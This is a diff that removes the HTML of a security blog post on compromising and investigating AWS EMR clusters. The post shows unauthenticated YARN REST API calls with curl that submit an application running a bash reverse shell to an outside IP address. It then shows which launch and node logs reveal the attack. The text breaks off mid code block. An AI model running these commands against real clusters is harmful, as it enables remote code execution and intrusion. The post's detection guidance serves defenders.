@@ -1,354 +1,204 @@
-<!doctype html><html lang=en>
-<head>
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-133811886-2')</script>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<script src=/js/nav.js></script>
-<link rel="shortcut icon" href=/favicon.ico>
-<link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous>
-<link rel=stylesheet href=/css/main.css>
-<title>
-emr_security_woes | jellyparks
-</title>
-</head>
-<body>
-<header>
-</header>
-<div class=site-wrapper>
-<div class="sticky top-bar">
-<div id=mySidenav class=sidenav include-nav=/nav.html>
-</div>
-<span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span>
-</div>
-<div class=container>
-<div class=blog-header>
-<h1>emr_security_woes</h1>
-</div>
-<div class=row>
-<div class="col-sm-8 blog-main">
-<div class=blog-post>
-<hr>
-<p>I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (here) &ldquo;&mldr;EMR is a manged cluster platform that simlifies running big data frameworks&mldr;&rdquo; Full disclosure I have virtually zero experience with big data and big data platforms. The closest I&rsquo;ve gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?</p>
-<p>The reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.</p>
-<hr>
-<h3 id=setting-up-a-cluster>Setting Up a Cluster</h3>
-<p>Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select <code>create</code> to create a cluster. Once the <code>Create Cluster - Quick Options</code> page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.</p>
-<p>Select the key pair to use for the instances which will be part of the cluster, and then click the <code>Create Cluster</code> button. A screenshot of the configuration setup is below.</p>
-<p><img src=images/create_cluster.png alt=create_cluster class=img-fluid></p>
-<p>The instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it&rsquo;s ready the cluster status will be <code>Waiting, Cluster Ready</code> the green dot next to the cluster name will be solid green as pictured below</p>
-<p><img src=images/cluster_ready.png alt=cluster_ready.png class=img-fluid></p>
-<p>In order to access the cluster make sure to add a security group to the primary node which gives access to 8088. <strong>DO NOT EXPOSE THIS TO THE ENTIRE INTERNET</strong>. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.</p>
-<hr>
-<h3 id=compromising-emr>Compromising EMR</h3>
-<p>As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.</p>
-<p>The first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl --request POST <span style=color:#0c6>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>If successful we get a response similar to the one below:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style=display:block;width:100%;background-color:#e5e5e5><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span></span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
-<span style=display:block;width:100%;background-color:#e5e5e5> <span style=color:#2c5dcd;font-weight:700>&#34;application-id&#34;</span>: <span style=color:#0c6>&#34;application_1590702911576_0016&#34;</span>,
-</span> <span style=color:#2c5dcd;font-weight:700>&#34;maximum-resource-capability&#34;</span>: {
-  <span style=color:#2c5dcd;font-weight:700>&#34;memory&#34;</span>: <span style=color:#5918bb;font-weight:700>12288</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;vCores&#34;</span>: <span style=color:#5918bb;font-weight:700>4</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;resourceInformations&#34;</span>: {
-   <span style=color:#2c5dcd;font-weight:700>&#34;resourceInformation&#34;</span>: [
-    {
-     <span style=color:#2c5dcd;font-weight:700>&#34;maximumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>9223372036854775807</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;minimumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>0</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;memory-mb&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;resourceType&#34;</span>: <span style=color:#0c6>&#34;COUNTABLE&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;units&#34;</span>: <span style=color:#0c6>&#34;Mi&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#5918bb;font-weight:700>12288</span>
-    },
-    {
-     <span style=color:#2c5dcd;font-weight:700>&#34;maximumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>9223372036854775807</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;minimumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>0</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;vcores&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;resourceType&#34;</span>: <span style=color:#0c6>&#34;COUNTABLE&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;units&#34;</span>: <span style=color:#0c6>&#34;&#34;</span>,
-     <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#5918bb;font-weight:700>4</span>
-    }
-   ]
-  }
- }
-}</code></pre></td></tr></table>
-</div>
-</div>
-<p>The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.</p>
-<p>The next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl --request POST <span style=color:#0c6>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps&#39;</span> <span style=color:#c5060b;font-weight:700>\
-</span><span style=color:#c5060b;font-weight:700></span>--header <span style=color:#0c6>&#39;Accept: application/json&#39;</span> <span style=color:#c5060b;font-weight:700>\
-</span><span style=color:#c5060b;font-weight:700></span>--header <span style=color:#0c6>&#39;Content-Type: application/json&#39;</span> <span style=color:#c5060b;font-weight:700>\
-</span><span style=color:#c5060b;font-weight:700></span>--data-raw <span style=color:#0c6>&#39;{
-</span><span style=color:#0c6> &#34;max-app-attempts&#34;:2,
-</span><span style=color:#0c6> &#34;am-container-sepc&#34;:{
-</span><span style=color:#0c6>  &#34;commands&#34;:{
-</span><span style=color:#0c6>   &#34;command&#34;:&#34;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;&#34;
-</span><span style=color:#0c6>   }
-</span><span style=color:#0c6> },
-</span><span style=color:#0c6> &#34;application-id&#34;:&#34;application_1590702911576_0016&#34;,
-</span><span style=color:#0c6> &#34;application-type&#34;:&#34;YARN&#34;,
-</span><span style=color:#0c6> &#34;application-anem&#34;:&#34;yupyup&#34;
-</span><span style=color:#0c6>}&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.</p>
-<p>In the web GUI at <code>http://PRIMARYHOST:8088/cluster</code> we see that the application ID we called to run will now have an execution history. The user will be <code>dr.who</code> because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the &lsquo;State&rsquo; and &lsquo;FinalStatus&rsquo; columns may say failed the shell code within the application was probably ran.</p>
-<p><img src=images/application_run.png alt=application_run class=img-fluid></p>
-<hr>
-<h3 id=logging>Logging</h3>
-<p>As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity above is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.</p>
-<p>When we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: <code>s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID</code>. Within this folder we can pull container logs out for each application. They&rsquo;ll be in a subfolder similar to this <code>/containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz</code></p>
-<p>The <code>launch_container.sh</code> log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...
-
-<span style=color:#0080ff;font-style:italic># Creating copy of launch script</span>
-
-cp <span style=color:#0c6>&#34;launch_container.sh&#34;</span> <span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
-
-chmod <span style=color:#5918bb;font-weight:700>640</span> <span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
-
-<span style=color:#0080ff;font-style:italic># Determining directory contents</span>
-
-<span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;ls -l:&#34;</span> 1&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
-
-ls -l 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
-
-<span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;find -L . -maxdepth 5 -ls:&#34;</span> 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
-
-find -L . -maxdepth <span style=color:#5918bb;font-weight:700>5</span> -ls 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
-
-<span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;broken symlinks(find -L . -maxdepth 5 -type l -ls):&#34;</span> 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
-
-find -L . -maxdepth <span style=color:#5918bb;font-weight:700>5</span> -type l -ls 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
-
-<span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;Launching container&#34;</span>
-
-<span style=color:#5918bb;font-weight:700>exec</span> /bin/bash -c <span style=color:#0c6>&#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>At this point we know what was ran, but we don&rsquo;t know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: <code>node/NODE INSTANCE ID/applications/hadoop-yarn</code></p>
-<p>These logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style=display:block;width:100%;background-color:#e5e5e5><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span></span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style=display:block;width:100%;background-color:#e5e5e5><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span></span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server <span style=color:#2c5dcd>(</span>Socket Reader <span style=color:#0080ff;font-style:italic>#1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE)</span>
-
-2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: Start request <span style=color:#2c5dcd;font-weight:700>for</span> container_1590702911576_0016_01_000001 by user dr.who
-
-2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: Creating a new application reference <span style=color:#2c5dcd;font-weight:700>for</span> app application_1590702911576_0016
-
-2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Application application_1590702911576_0016 transitioned from NEW to INITING
-
-<span style=display:block;width:100%;background-color:#e5e5e5>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: USER<span style=color:#2c5dcd>=</span>dr.who IP<span style=color:#2c5dcd>=</span>172.31.18.33 OPERATION<span style=color:#2c5dcd>=</span>Start Container Request TARGET<span style=color:#2c5dcd>=</span>ContainerManageImpl RESULT<span style=color:#2c5dcd>=</span>SUCCESS APPID<span style=color:#2c5dcd>=</span>application_1590702911576_0016 CONTAINERID<span style=color:#2c5dcd>=</span>container_1590702911576_0016_01_000001
-</span>
-2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016
-
-2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Application application_1590702911576_0016 transitioned from INITING to RUNNING
-
-2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED
-
-2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Got event CONTAINER_INIT <span style=color:#2c5dcd;font-weight:700>for</span> appId application_1590702911576_0016
-
-2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Initializing container container_1590702911576_0016_01_000001
-
-2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Starting container <span style=color:#2c5dcd>[</span>container_1590702911576_0016_01_000001<span style=color:#2c5dcd>]</span>
-
-2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING
-
-2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Starting resource-monitoring <span style=color:#2c5dcd;font-weight:700>for</span> container_1590702911576_0016_01_000001
-
-<span style=display:block;width:100%;background-color:#e5e5e5>2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>Container Monitor<span style=color:#2c5dcd>)</span>: container_1590702911576_0016_01_000001<span style=color:#fff;background-color:#c00>&#39;</span>s ip <span style=color:#2c5dcd>=</span> 172.31.22.26, and hostname <span style=color:#2c5dcd>=</span> ip-172-31-22-26.ec2.internal
-</span>
-2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>Container Monitor<span style=color:#2c5dcd>)</span>: Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available.
-
-2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl <span style=color:#2c5dcd>(</span>Node Status Updater<span style=color:#2c5dcd>)</span>: NM node labels <span style=color:#2c5dcd>{}</span> were not accepted by RM and message from RM : null</code></pre></td></tr></table>
-</div>
-</div>
-<p>On line 9 in the logs above we can see that the anonymous user &lsquo;dr.who&rsquo; requested to start a container, the application ID, and the container ID for the particular request. On line 27 we can see the node within our cluster which ran the malicious application.</p>
-<p>Additional logs can be found on the nodes themselves. Another way we can see activity is by pulling the hadoop-yarn-resourcemanager logs out of the primary server.</p>
-<p>Within this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container <code>container_1590702911576_0016_01_000001</code> work to the <code>172.31.22.26</code> host. This is a great way to determine which host(s) the malicious activity occured on.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode <span style=color:#2c5dcd>(</span>SchedulerEventDispatcher:Event Processor<span style=color:#2c5dcd>)</span>: Assigned container container_1590702911576_0016_01_000001 of capacity memory:32, vCores:1 on host ip-172-31-22-26.ec2.internal:8041, which has <span style=color:#5918bb;font-weight:700>1</span> containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation
-</code></pre></td></tr></table>
-</div>
-</div><p>Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
